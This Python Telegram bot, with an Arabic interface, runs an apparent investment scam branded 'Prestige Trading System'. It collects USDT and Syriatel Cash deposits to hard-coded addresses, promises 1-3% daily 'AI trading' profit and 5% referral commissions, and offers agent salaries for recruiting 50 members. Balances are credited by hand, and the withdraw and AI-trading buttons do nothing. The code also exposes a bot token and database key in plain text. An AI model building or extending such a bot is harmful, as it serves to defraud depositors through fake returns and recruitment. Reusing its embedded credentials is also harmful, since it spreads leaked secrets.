import telebot
from telebot import types
from supabase import create_client, Client
import logging
import time

# --- الإعدادات الفنية والتكوين ---
TOKEN = "8795395476:AAFVU9fXwQF8dwlh8kSnK1Z9GnOY4VEag8Q" 
SUPABASE_URL = "https://asogzloqqxbjgnjifotm.supabase.co"
SUPABASE_KEY = "sb_publishable_m6k-9uz3UVraGkVbjlQqaQ_mCsI7Mht"
ADMIN_ID = 6091303835 
SUPPORT_LINK = "https://t.me/tradinghubsy"

# بيانات المحافظ (للعرض والنسخ)
USDT_ADDR = "0xbe3a3F17f1574EE9483eab41B9EE2022Ec316149"
CASH_ADDR = "92274277 - 26092765"

# إعدادات البوت والقاعدة
bot = telebot.TeleBot(TOKEN)
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
logging.basicConfig(level=logging.INFO)

# --- 1. بناء القوائم الاحترافية (Inline Keyboards) ---

def main_menu_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📥 إيداع رصيد", callback_data="deposit"),
        types.InlineKeyboardButton("📤 سحب أرباح", callback_data="withdraw"),
        types.InlineKeyboardButton("👤 محفظتي", callback_data="wallet"),
        types.InlineKeyboardButton("👥 فريقي", callback_data="team"),
        types.InlineKeyboardButton("📈 تداول آلي (AI)", callback_data="trade_ai"),
        types.InlineKeyboardButton("💰 اربح معنا", callback_data="earn_with_us"),
        types.InlineKeyboardButton("🎁 جوائز الوكلاء", callback_data="agent_rewards"),
        types.InlineKeyboardButton("🛠 الدعم الفني", url=SUPPORT_LINK)
    )
    if user_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("👑 لوحة التحكم (الأدمن)", callback_data="admin_panel"))
    return markup

def back_home_kb():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_main"))

def admin_panel_kb():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📊 إحصائيات النظام", callback_data="adm_stats"),
        types.InlineKeyboardButton("📣 إرسال إعلان للكل", callback_data="adm_broadcast"),
        types.InlineKeyboardButton("🔎 فحص حساب مستخدم", callback_data="adm_search"),
        types.InlineKeyboardButton("💵 تعديل أرصدة", callback_data="adm_edit_bal"),
        types.InlineKeyboardButton("🚫 حظر مستخدم", callback_data="adm_block"),
        types.InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
    )
    return markup

# --- 2. معالجة البداية والتسجيل ---

@bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.from_user.id
    uname = message.from_user.username or "User"
    
    # حذف الكيبورد القديم لضمان النظافة
    bot.send_message(uid, "🔄 جاري ربط حسابك بالخوادم...", reply_markup=types.ReplyKeyboardRemove())
    
    # التحقق من وجود إحالة
    referrer = None
    if len(message.text.split()) > 1:
        ref_id = message.text.split()[1]
        if ref_id.isdigit() and int(ref_id) != uid:
            referrer = int(ref_id)

    # تسجيل في Supabase
    try:
        supabase.table("users").upsert({
            "id": uid, 
            "username": uname,
            "referred_by": referrer
        }).execute()
    except: pass

    welcome_text = (
        f"🏆 **Prestige Trading System**\n\n"
        f"مرحباً بك يا {uname} في المنصة الرسمية.\n"
        f"نحن هنا لنأخذ تداولك إلى مستوى الاحتراف.\n\n"
        f"رصيدك: **0.00$**\n"
        f"حالة الحساب: **نشط ✅**"
    )
    bot.send_message(uid, welcome_text, reply_markup=main_menu_keyboard(uid), parse_mode="Markdown")

# --- 3. معالجة الضغط على الأزرار (Logic) ---

@bot.callback_query_handler(func=lambda call: True)
def handle_queries(call):
    uid = call.from_user.id
    mid = call.message.message_id
    
    # العودة للرئيسية
    if call.data == "back_main":
        bot.edit_message_text("القائمة الرئيسية لـ Prestige:", uid, mid, reply_markup=main_menu_keyboard(uid))

    # قسم المحفظة
    elif call.data == "wallet":
        try:
            res = supabase.table("users").select("balance").eq("id", uid).execute()
            bal = res.data[0]['balance'] if res.data else 0.0
        except: bal = 0.0
        
        text = (f"👤 **مركزك المالي**\n\n"
                f"💰 الرصيد الحالي: `{bal}$`\n"
                f"📊 أرباح اليوم: `0.00$`\n"
                f"⏳ سحوبات معلقة: `0.00$`\n\n"
                f"التصنيف: **مستثمر فضي**")
        bot.edit_message_text(text, uid, mid, reply_markup=back_home_kb(), parse_mode="Markdown")

    # قسم فريقي ورابط الإحالة
    elif call.data == "team":
        invite_link = f"https://t.me/Prestige_Trading_Bot?start={uid}"
        text = (f"👥 **نظام الشركاء**\n\n"
                f"اربح 5% من كل إيداع يقوم به فريقك فوراً.\n\n"
                f"رابط دعوتك الحصري:\n`{invite_link}`\n\n"
                f"عدد الفريق: **0**\n"
                f"إجمالي العمولات: **0.00$**")
        bot.edit_message_text(text, uid, mid, reply_markup=back_home_kb(), parse_mode="Markdown")

    # قسم اربح معنا
    elif call.data == "earn_with_us":
        text = ("💰 **كيفية الربح مع Prestige**\n\n"
                "1. الإيداع والتداول الآلي (ربح يومي 1-3%).\n"
                "2. نظام الإحالات (5% عمولة مباشرة).\n"
                "3. المكافآت الأسبوعية للأعضاء النشطين.\n\n"
                "تأكد من متابعة قناة الإنجازات.")
        bot.edit_message_text(text, uid, mid, reply_markup=back_home_kb(), parse_mode="Markdown")

    # جوائز الوكلاء
    elif call.data == "agent_rewards":
        text = ("🎁 **جوائز الوكلاء (Agents)**\n\n"
                "عند وصول فريقك لـ 50 عضو نشط:\n"
                "• راتب شهري 100$.\n"
                "• بونص إيداع 10%.\n\n"
                "تواصل مع الإدارة لطلب ترقية وكيل.")
        bot.edit_message_text(text, uid, mid, reply_markup=back_home_kb(), parse_mode="Markdown")

    # الإيداع
    elif call.data == "deposit":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("USDT (BEP20) ⚡️", callback_data="pay_usdt"),
            types.InlineKeyboardButton("سيريتل كاش 🇸🇾", callback_data="pay_cash"),
            types.InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
        )
        bot.edit_message_text("📥 **اختر وسيلة الإيداع لفتح حساب تداول:**", uid, mid, reply_markup=markup)

    elif call.data.startswith("pay_"):
        addr = USDT_ADDR if "usdt" in call.data else CASH_ADDR
        msg = (f"⚠️ **خطوات الإيداع**\n\n"
               f"1. حول المبلغ لعنواننا التالي:\n`{addr}`\n\n"
               f"2. التقط صورة (سكرين) للتحويل الناجح.\n"
               f"3. أرسل الصورة هنا لتفعيل حسابك.")
        bot.edit_message_text(msg, uid, mid, parse_mode="Markdown")

    # --- لوحة التحكم (أدمن فقط) ---
    elif call.data == "admin_panel" and uid == ADMIN_ID:
        bot.edit_message_text("👑 **غرفة التحكم المركزية**", uid, mid, reply_markup=admin_panel_kb())

    elif call.data == "adm_stats" and uid == ADMIN_ID:
        res = supabase.table("users").select("id", count="exact").execute()
        count = res.count
        bot.answer_callback_query(call.id, f"📊 عدد المستخدمين الكلي: {count}", show_alert=True)

# --- 4. استلام الصور ومعالجتها (إشعارات الإيداع للأدمن) ---

@bot.message_handler(content_types=['photo'])
def handle_deposit_images(message):
    uid = message.from_user.id
    uname = message.from_user.username or "Unknown"
    
    # توجيه للصورة للأدمن مع المعلومات
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    caption = (f"🔔 **طلب إيداع جديد!**\n\n"
               f"👤 المستخدم: @{uname}\n"
               f"🆔 الآيدي: `{uid}`\n"
               f"يرجى مراجعة الحساب وشحن الرصيد يدوياً.")
    bot.send_message(ADMIN_ID, caption, parse_mode="Markdown")
    
    # رد على المستخدم
    bot.reply_to(message, "✅ **تم استلام طلبك بنجاح!**\nجاري تدقيق العملية وسوف يتم إشعارك فور تفعيل الرصيد.")

# --- 5. التشغيل المستمر ---
print("🚀 Prestige Trading Bot is now Online & Secure...")
bot.infinity_polling(timeout=60, long_polling_timeout=60)

# نهاية الكود الاحترافي
